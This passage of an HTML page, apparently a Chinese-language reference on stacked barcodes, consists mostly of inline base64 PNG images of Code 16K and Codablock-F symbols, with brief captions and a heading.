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OPP66cnJwafzLbuHGjUlNT1a1bNzVr1kyBgYEKDw9X165d9fDDD2vDhg01Xr+GVOeGDRucm88hISH67LPPlJyc7DGEyvXv31+rV69WeHi4JOnVV1/Vzz//7HHa7du367HHHtPll1+uqKgoNW7cWC1bttT111+vyZMn68CBA1XWd+rUKb322mvq0aOHIiIiFBYWpvj4eI0dO1a7d+/2eT337t2rZ599Vj179nTqaNWqlfr06eO3+x7+2OczZ87UgQMHFBkZqbfeeqtCCJVr0aKF1q9fr1WrVjmhVR1LlizR0KFDVVRUpLi4OK1cubLKEDon2b42WFsTJkwwMTExJiIiwrlmGhUVZWJiYkxMTIyZO3euMabqe0TFxcXmtttuO+N1+Li4OPPrr796rOPYsWOmV69eFaZv0qSJadSokZFkOnXqZLZv325iY2ONJDNkyBCP7aSlpTnz79q1y+ft8PnnnzvzPfbYYz7NU36PaMiQISYrK8uEh4d7XXdv1/v3799vPvvsswr/99JLL1XrOvzMmTOd/VP+V77dyv8CAgLM66+/7tN6NeQ6k5OTnbamT59erXnfffdd89JLL5kff/zRa/3u90kCAgJMs2bNjMvlqnDsZGdne5z/+PHjpnfv3pXuTZW32aJFC7Nu3TrTtGnTKl8zGRkZFV5rLpfLhISEVGg3Nja21vc+/LHPExISjCTz0EMP1biOqu4RLV261Ln31LlzZ6/vL6fbvn270+aiRYtqXFt90eCDqNz777/v7JilS5dWGl9VEE2ZMsWZ94YbbjCrV682R44cMSdPnjS5ubnmkUceccZ7u7GfmprqTJOUlGQ2btxojCk7eGfNmmUiIyPN9ddf77z5eztIbQRRUlKSiY6ONn379jWrVq0yR44cMfv27TMfffSRufjii512vb1Bna46B/uWLVtMYGCgkWS6d+9usrKyzMGDB40xxhw6dMgsWrTIeTNo1KiR+e6773yqoSHWefLkSRMcHGwkmejoaHPixIkarZcn8+fPd9Y1Pj7eLFmyxJw8edIYY8yRI0fM7NmzTbNmzYwkExYWZn766adKbYwdO9ZpY+DAgWbbtm3GGGNKSkrMF198YXr06GHi4+OddfD0Gv/888+d4CrfjsePHzfGGLN3714zY8YMExUV5QRbfn6+37aBMdXb5wUFBc607733nikuLjYzZ8401113nYmOjjZNmzY1HTt2NKmpqWbHjh1e2/EWRJmZmU4IdenSxezZs8fn9SCI6qnaBNEll1xiJJmQkBBz9OhRj+0PHTrUaf/nn3+uMK6goMA5uOLj4z2+gfz3v/+t8GnaWxC594apqyCSZAYNGmRKSkoqTTN37lxnmgkTJvjUbnUO9ldeecWZdsOGDR6nKSgoMGFhYSYiIsK8+uqrPtXQEOt034f+7HFWUlJi2rZt65zxeHvDW7x4sbP8u+66q8K4gwcPOm+acXFxToi5O3z4sGnTpo3XdSgtLTXdunVz2jh8+LDHOnJycpwzzVGjRtVwrT2rzj5fsWKFM21WVpa59tprvV4xCA4ONvPnz/fYjqcgysrKcs4cExISTF5eXrXWwz2IFi5cWK1566MGf4/IH7Kzs7V27VplZWUpNDTU4zQ333yzM7xx48YK4zIzM1VcXCxJSk1NrdBxoNy1117r03d4du3a5Qx7q8XfXC6X/v73v3vs5DFw4EBn+JdffvH7st17OzZv3tzjNNHR0crPz9fBgwf16KOP+r0GX9RFndu3b3eGr7zyyuoX6cXy5cud76I8+OCDuvDCCz1Od8stt6hr166SpI8++kiFhYXOuMzMTJ08eVKS9NBDD6lx48aV5g8PD69yvVevXu3cQ3vmmWece1qnS0xM1C233CJJev/9963djHc/FseNG6d169bpmWee0TfffKMDBw7oxx9/1AsvvKCmTZvqxIkTuv322326R/jpp5/q1ltvVWFhoS644AJlZ2erZcuW1aotODjYGXbvadtQEUSSLrnkEvXs2VPXXXed12mioqKc4cOHD1cY9+233zrDffr08drGnXfeecZali9fLkm66KKLKizzbIqPj1e7du08jgsNDXVe9Hl5eX5fdvkbnySNGDHCa9i5H3g21EWd+/btc4ajo6Nr3M7pVq9e7Qy7f6Dy5MYbb5QknThxosIHrm+++cYZruo4qaq35sqVK53ha665pso6evfuLalsm2zZsqXKac8W9+P8m2++0ccff6znn39el19+uSIjI9WpUyc9/fTTSk9PlyQVFhbq6aefrrLNFStWaNCgQTpx4oQk6bffftP7779f7dpiYmKcD0Tl7xkN2TnTfbu2SktLtWjRIi1btkw7d+5UXl6ejhw54nQLP3LkiDOtcesqLsn5tCmVhZo3iYmJXscdP35cU6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" alt="Code 16K">
<figcaption aria-hidden="true">Code 16K</figcaption>
</figure>
<p>ASCII 全部 128 个字符。</p>
<h2 id="codablock-f-码">Codablock-F 码</h2>
<figure>
<img src="data:image/png;base64,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XvPmzTO0rWHDhobPz58/H5JlUlBQoKZOnepynv/617+GpA26YxlZs3fvXtWvXz9ls9l8+i1ERUWpYcOGqUOHDvlV76effqrq1q1rqa46deqolStXlvGcm1WuXNlQbziFYpvvTx06rjdvgrksV69eHZR9zYABA5RSSu3Zs0e1atVK3XnnnSoqKspUbuzYsWU6P7c7wqqPOnbsaPjCNW3aVH3++efq7Nmz6tSpU+rUqVOG8hU1rB4/flxFREQYltX06dPVtWvXTGUrSlj99ttvVevWrd22kSDGMrLiypUrLv8I+vqy2+1q5syZqrCw0HLdc+fO9auuuXPnBnGJEFa90XW9eVOew2ppOTk5auzYsYZysbGx6sqVK2U6T7ez8nURiAaOHTtmGP7www+lXbt24WmMxrZv3y4lJSWO4T59+shLL73ksuzvf/97Q1l3du/eLe+++65juG7dujJjxgxL7enUqZOlcsFQUlIir732mkybNs1wei0mJqZCnG6zgmVkzdGjR6V///7yr3/9y/RZVFSUdO3aVVq0aCG1atWShIQEycnJkdOnT8vu3btl7969ht9ZUVGRzJw5U/bu3St//vOfJSYmxmPdn3zyiUyePNnwXqNGjeSxxx6TDh06SM2aNeXy5cuyf/9+ef/99+Xw4cOOcpMnT5aUlBT5xS9+EeASgK9Yb9YkJCTI7NmzA55Oamqq6b34+Hh54403ZN++fbJz504REcnPz5ddu3ZJ7969A66zQgh3Wi5PiouLDUcLIyMjVUlJicdxKuqR1ZdeesnwL/LDDz8MeJoffPCBYZotWrTwe1qhOrKalZWl7rvvPkNdVapUUcuXL1cDBgzgqKFiGVl17NgxVbNmTdORnHr16ql33nlH5eTkeBz/xx9/VNOmTVOVKlUyTWPIkCEex7148aKqXr26YZzhw4e7PFOi1M1LOcaNG2coX716dXXp0iW/598Tjqy6pvt68yaUR1br1atXptN35a233jLUuWTJkqDXebvgBisflJSUGI5M3LoDFWbOF4+np6eHqSXhNXHiRNm+fbtjuH379rJ//3757//+7zC2Si8sI+8KCgrkF7/4hanXihEjRsjRo0dlxIgREh8f73Ea9evXl1mzZsk///lPadmypeGzVatWyZIlS9yOu2DBArl8+bJjuGfPnrJ06VKJi4tzWT4qKkpef/116dev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